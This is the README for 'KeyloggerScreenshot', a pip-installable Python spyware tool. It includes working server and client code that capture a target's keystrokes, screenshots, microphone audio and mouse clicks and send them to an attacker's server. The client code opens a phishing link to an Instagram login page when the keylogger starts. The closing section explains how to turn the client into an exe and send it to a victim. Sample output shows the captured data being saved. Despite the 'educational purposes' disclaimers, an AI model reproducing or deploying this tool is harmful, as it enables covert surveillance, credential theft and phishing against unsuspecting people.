KeyloggerScreenshot
===================

Created by: Fawaz Bashiru

KeyloggerScreenshot allows the attacker to get all the information the target was typing and taking screenshot of specific minutes which is being calculated in the script and all the audio of the target was speaking will be stored where your server is located. You can open a link when the keylogger is executed. Follow the instructions to build your own server in "KeyloggerScreenshot"

check out my github (easier way): https://github.com/Kill0geR/KeyloggerScreenshot

GITHUB-VERSION (SNEAK PEAK):
----------------------------
![kali_img](https://user-images.githubusercontent.com/106278241/206914635-c9d5e505-9499-4dce-91ed-5254f495929d.png)


SHOUT OUT TO:
-------------
NAME: dyma020

Link to his insta: https://www.instagram.com/dyma020/

He had the idea of the mouse information. He also build the graphical user interface. Big thanks to him

HOW DOES KeyloggerScreenshot WORK?
-----------------------------------
To install KeyloggerScreenshot simply write:

`pip install KeyloggerScreenshot`

in your terminal

After that create a server:

Server
------ 
```python
#EveryServer.py:
import KeyloggerScreenshot as ks
import threading

ip = "127.0.0.1"

ip_photos, port_photos = ip, 1111
server_photos = ks.ServerPhotos(ip_photos, port_photos)

ip_keylogger, port_keylogger = ip, 2222
server_keylogger = ks.ServerKeylogger(ip_keylogger, port_keylogger)

ip_listener, port_listener = ip, 3333
server_listener = ks.ServerListener(ip_listener, port_listener)

ip_time, port_time = ip, 4444
server_time = ks.Timer(ip_time, port_time)

threading_server = threading.Thread(target=server_photos.start)
threading_server.start()

threading_server2 = threading.Thread(target=server_keylogger.start)
threading_server2.start()

threading_server3 = threading.Thread(target=server_listener.start)
threading_server3.start()

threading_server4 = threading.Thread(target=server_time.start_timer)
threading_server4.start()
```

Client
------

```python
#client_target.py
import KeyloggerScreenshot as ks

ip = '127.0.0.1'
key_client = ks.KeyloggerTarget(ip, 1111, ip, 2222, ip, 3333,ip, 4444, duration_in_seconds=60, phishing_web="https://www.instagram.com/accounts/login/?__coig_restricted=1") # You can open a link when the keylogger starts
key_client.start()
```
You can specify the time of running in seconds in the "duration_in_seconds" variable


Essential Informations:
------------------------
* This module can be used in Windows and Linux

* The servers can now be run in the same file with the module threading

* The port number for each server should be different

* The server should obviously be run before the client

* You can just copy the following code and insert you ip-address in the variable "ip"

* You can find your ip-address in the command line by using the command "ipconfig"

* If you want a cool simulation you can specify that in ServerKeylogger by setting the Parameter simulater to True

* You can open a link that you can choose when the keylogger is executed. Set the Parameter "phishing_web" to your link

* If you really want to send this to work externally, you have to buy a server and download the code on my github.

* If backspace is pressed the last pressed character will be deleted from the list

Output
-------
```    __ __              __                                 _____                                       __            __ 
   / //_/___   __  __ / /____   ____ _ ____ _ ___   _____/ ___/ _____ _____ ___   ___   ____   _____ / /_   ____   / /_
  / ,<  / _ \ / / / // // __ \ / __ `// __ `// _ \ / ___/\__ \ / ___// ___// _ \ / _ \ / __ \ / ___// __ \ / __ \ / __/
 / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
/_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
            /____/           /____/ /____/    

                        ~Created by: Fawaz Bashiru~          
                        ~Write "python KLS_start.py -help" for help in the github version~   
                        REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES  
                        SO DON'T USE THIS FOR EVIL ACTIVITIES !!!!!                        
        
Cyan: ServerPhotos
Blue: ServerKeylogger
Green: ServerListener
White: Timer

Waiting for connection...
Waiting for connection...
Waiting for connection....
Connection has been established with ('127.0.0.1', 49162)
The target is being connected. The Data of the target is coming....
Time left: 00:01
Successful connection for 1 minutes


Connection has been established with ('127.0.0.1', 49199)

Connection has been established with ('127.0.0.1', 49198)
The coordinates of the target have been saved to your directory
True
Text of target: Hello and welcome to KeyloggerScreenshot. I hope you like it and please remember do not use this for evil activities [TAB] 
"Audio of Target.wav" has been saved to your directory
Simulation will come in 10 seconds!!!
3 Images has been saved to your working directory
Waiting for connection...
Do you want to start y/n?: y

The target has clicked 1 times on his screen
This simulation will last for 0 minutes and 27 seconds

Time left: 00:01
THANK YOU FOR YOU USING KEYLOGGERSCREENSHOT
ERFOLGREICH: Der Prozess mit PID 7768 wurde beendet.
```


Directory of Attacker
---------------------
![endresult](https://user-images.githubusercontent.com/106278241/210905855-35bc8cc1-435e-4dc6-bae7-62fcdedd1484.png)

Additional
==========
* You can send "target.py" as an exe file to the target with "auto-py-to-exe"

* KeyloggerScreenshot is very easy to use.

* The servers can be used on any OS. The client should be a Windows OS

* DO NOT USE THIS TO ATTACK SOMEONE FOREIGN. I BUILD IT FOR EDUCATIONAL PURPOSES.

* Simulation_code.py wont work properly on Virtual Machine

* Server will shutdown automatically after everything has been sent to the server.

